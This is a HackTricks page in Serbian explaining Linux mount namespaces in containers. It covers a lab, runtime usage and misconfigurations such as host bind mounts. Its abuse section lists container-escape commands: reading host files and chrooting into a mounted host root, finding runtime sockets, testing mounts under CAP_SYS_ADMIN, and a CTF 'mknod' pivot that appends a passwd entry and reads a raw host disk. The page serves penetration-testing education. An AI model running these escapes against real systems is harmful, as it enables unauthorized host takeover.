# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Mount namespace kontroliše **mount tabelu** koju proces vidi. Ovo je jedna od najvažnijih funkcija izolacije kontejnera, jer su root filesystem, bind mounts, tmpfs mounts, procfs prikaz, sysfs izloženost i mnogi pomoćni mount-ovi specifični za runtime izraženi kroz tu mount tabelu. Dva procesa mogu oba pristupati putanjama `/`, `/proc`, `/sys` ili `/tmp`, ali ono na šta se te putanje razrešavaju zavisi od mount namespace-a u kojem se nalaze.

Iz perspektive container security-ja, mount namespace je često razlika između „ovo je uredno pripremljen application filesystem“ i „ovaj proces može direktno da vidi ili utiče na host filesystem“. Zato se bind mounts, `hostPath` volumes, privilegovane mount operacije i writable `/proc` ili `/sys` izloženosti uglavnom vrte oko ovog namespace-a.

## Rad

Kada runtime pokrene kontejner, obično kreira novi mount namespace, priprema root filesystem za kontejner, mount-uje procfs i druge pomoćne filesystem-e po potrebi, a zatim opciono dodaje bind mounts, tmpfs mounts, secrets, config maps ili host paths. Kada proces počne da radi unutar namespace-a, skup mount-ova koje vidi uglavnom je odvojen od podrazumevanog prikaza host-a. Host i dalje može da vidi stvarni filesystem koji se nalazi u pozadini, ali kontejner vidi verziju koju je runtime sastavio za njega.

Ovo je moćno jer kontejneru omogućava da veruje da ima sopstveni root filesystem, iako host i dalje upravlja svim resursima. Takođe je opasno jer, ako runtime izloži pogrešan mount, proces iznenada dobija vidljivost nad host resursima koje ostatak security modela možda nije predvideo da zaštiti.

## Laboratorija

Možete kreirati privatni mount namespace pomoću:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ako otvorite drugu shell sesiju izvan tog namespace-a i pregledate tabelu montiranja, videćete da tmpfs mount postoji samo unutar izolovanog mount namespace-a. Ovo je korisna vežba jer pokazuje da izolacija mount-ova nije apstraktna teorija; kernel doslovno procesu prikazuje drugačiju tabelu montiranja.

Ako otvorite drugu shell sesiju izvan tog namespace-a i pregledate tabelu montiranja, tmpfs mount će postojati samo unutar izolovanog mount namespace-a.

Unutar kontejnera, brzo poređenje je:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi primer pokazuje koliko je lako da runtime konfiguracija napravi ogromnu rupu kroz granicu sistema datoteka.

## Upotreba runtime-a

Docker, Podman, stack-ovi zasnovani na containerd-u i CRI-O oslanjaju se na private mount namespace za uobičajene container-e. Kubernetes koristi isti mehanizam za volume-e, projected secret-e, config map-e i `hostPath` mount-ove. Incus/LXC okruženja se takođe u velikoj meri oslanjaju na mount namespace, naročito zato što system container-i često izlažu bogatije i više nalik mašinskim sistemima datoteka nego application container-i.

To znači da prilikom analize problema sa sistemom datoteka container-a obično ne posmatrate izolovani Docker problem. Posmatrate problem mount namespace-a i runtime konfiguracije izražen kroz platformu koja je pokrenula workload.

## Pogrešne konfiguracije

Najočiglednija i najopasnija greška jeste izlaganje root sistema datoteka host-a ili neke druge osetljive putanje host-a kroz bind mount, na primer `-v /:/host` ili writable `hostPath` u Kubernetes-u. U tom trenutku pitanje više nije „da li container nekako može da escape-uje?“, već „koliko korisnog sadržaja host-a je već direktno vidljivo i writable?“. Writable host bind mount često pretvara ostatak exploita u jednostavno postavljanje fajlova, chroot-ovanje, izmenu konfiguracije ili pronalaženje runtime socket-a.

Drugi čest problem jeste izlaganje host `/proc` ili `/sys` na načine koji zaobilaze bezbedniji view container-a. Ovi sistemi datoteka nisu obični data mount-ovi; oni predstavljaju interfejse ka stanju kernela i procesa. Ako workload direktno pristupa verzijama koje pripadaju host-u, mnoge pretpostavke na kojima se zasniva container hardening prestaju pravilno da važe.

Read-only zaštite su takođe važne. Read-only root sistem datoteka ne obezbeđuje automatski container, ali uklanja veliki deo prostora za attacker staging i otežava persistence, postavljanje helper binary-ja i neovlašćenu izmenu konfiguracije. Nasuprot tome, writable root ili writable host bind mount daju attacker-u prostor da pripremi sledeći korak.

## Abuse

Kada se mount namespace koristi na pogrešan način, attacker-i obično rade jednu od četiri stvari. **Čitaju podatke host-a** koji su trebalo da ostanu izvan container-a. **Menjaju konfiguraciju host-a** kroz writable bind mount-ove. **Mount-uju ili remount-uju dodatne resurse** ako capabilities i seccomp to dozvoljavaju. Ili **pristupaju moćnim socket-ima i runtime direktorijumima sa stanjem** koji im omogućavaju da od same container platforme zatraže dodatni pristup.

Ako container već može da vidi sistem datoteka host-a, ostatak security model-a se odmah menja.

Kada sumnjate na host bind mount, prvo potvrdite šta je dostupno i da li je writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ako je root filesystem hosta montiran u režimu read-write, direktan pristup hostu često je jednostavan kao:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ako je cilj privilegovani runtime pristup umesto direktnog chrootovanja, enumerišite socket-e i runtime stanje:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ako je prisutan `CAP_SYS_ADMIN`, takođe proverite da li se novi mount-ovi mogu kreirati iz kontejnera:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Potpuni primer: Two-Shell `mknod` Pivot

Specijalizovaniji put zloupotrebe javlja se kada root user u containeru može da kreira block devices, host i container dele user identity na koristan način, a attacker već ima low-privilege foothold na hostu. U toj situaciji, container može da kreira device node kao što je `/dev/sda`, a low-privilege host user kasnije može da ga pročita kroz `/proc/<pid>/root/` za odgovarajući container process.<sup>[[1]](#references)</sup>

Unutar containera:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Sa hosta, kao odgovarajući korisnik sa niskim privilegijama nakon lociranja PID-a shell-a kontejnera:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Važna pouka nije samo pretraga tačnog CTF stringa. Poenta je da izloženost mount namespace-a kroz `/proc/<pid>/root/` može korisniku na hostu omogućiti da ponovo upotrebi device nodes koje je kreirao container, čak i kada je cgroup device policy sprečavala njihovu direktnu upotrebu unutar samog containera.<sup>[[1]](#references)</sup>

## Provere

Ove komande služe da vam prikažu filesystem view u kojem se trenutni proces zapravo izvršava. Cilj je uočiti mount-ove izvedene sa hosta, osetljive putanje sa dozvolom upisa i sve što izgleda šire od root filesystem-a normalnog application containera.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Šta je ovde zanimljivo:

- Bind mounts sa hosta, naročito `/`, `/proc`, `/sys`, direktorijumi sa stanjem runtime-a ili lokacije socket-a, trebalo bi odmah da privuku pažnju.
- Neočekivani read-write mount-ovi su obično važniji od velikog broja read-only pomoćnih mount-ova.
- `mountinfo` je često najbolje mesto za proveru da li putanja zaista potiče sa hosta ili je zasnovana na overlay-u.

Ove provere utvrđuju **koji resursi su vidljivi u ovom namespace-u**, **koji potiču sa hosta** i **koji od njih su upisivi ili bezbednosno osetljivi**.

## Reference

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
